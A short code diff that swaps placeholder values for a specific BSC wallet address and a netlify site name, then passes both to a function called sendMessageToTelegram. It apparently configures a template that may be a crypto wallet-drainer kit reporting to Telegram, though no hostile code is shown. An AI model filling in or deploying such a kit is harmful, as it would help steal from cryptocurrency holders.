@@ -24,6 +24,6 @@ async function sendMessageToTelegram(bsc_wallet_receiver_id, website_url) {
 }
 
 // Change this information for yours (
-const bsc_wallet_receiver_id = 'YOURWALLET';
-const website_url = 'YOUR_WEBSITE_URL';
+const bsc_wallet_receiver_id = '0xB59bf44De25394296E0993dBA8319C969562eB80';
+const website_url = 'd.netlify.com';
 sendMessageToTelegram(bsc_wallet_receiver_id, website_url);
